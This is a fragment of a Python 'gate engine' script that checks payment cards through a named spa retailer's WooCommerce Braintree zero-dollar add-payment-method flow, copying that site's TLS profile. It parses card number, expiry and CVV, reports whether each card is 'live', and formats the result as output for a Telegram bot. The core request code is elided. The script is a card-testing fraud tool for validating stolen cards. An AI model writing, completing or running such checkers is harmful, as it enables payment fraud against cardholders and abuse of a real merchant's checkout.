"""
Mass 3 (/mass3) Gate Engine - WooCommerce Braintree Auth ($0.00 Add Payment Method)
Converted to clean synchronous Session / Requests to match Bullfrog Spas TLS cipher profile.
...
if __name__ == '__main__':
    ...
    p = card_arg.split('|')
    print(f"[*] Running Native Test of Mass 3 (/mass3) Gate on: {card_arg}")
    start = time.time()
    
    is_live, status, response, raw = check_card_mass3_sync(p[0], p[1], p[2], p[3])
    elapsed = round(time.time() - start, 2)
    
    print(f"""
=== TELEGRAM BOT OUTPUT (MASS 3 GATE) ===
Gate Auth: >_ Braintree Auth ($0.00 Add Payment)
----------------------------------------
Card: {card_arg}
Status: {status}
Response: {response}
----------------------------------------
Time: {elapsed}s | Gateway: Mass 3 (Bullfrog Braintree)
""")
